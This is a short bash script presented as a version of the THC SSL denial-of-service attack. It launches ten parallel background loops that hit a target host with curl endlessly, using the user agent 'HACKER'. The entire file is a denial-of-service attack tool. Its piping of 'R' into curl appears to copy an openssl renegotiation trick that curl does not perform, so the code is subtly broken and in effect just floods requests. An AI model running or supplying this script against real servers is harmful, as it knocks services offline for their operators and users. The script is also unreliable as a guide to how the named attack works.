#!/bin/bash
# author: wuzhimang@gmail.com

target=localhost # IP
parallel=10

thc-ssl-dosit()
{
    while :;
    do
        (while :; do echo R; done) | curl -A "HACKER" $target 2>/dev/null;
    done
}

for x in `seq 1 $parallel`;
do
    thc-ssl-dosit &
done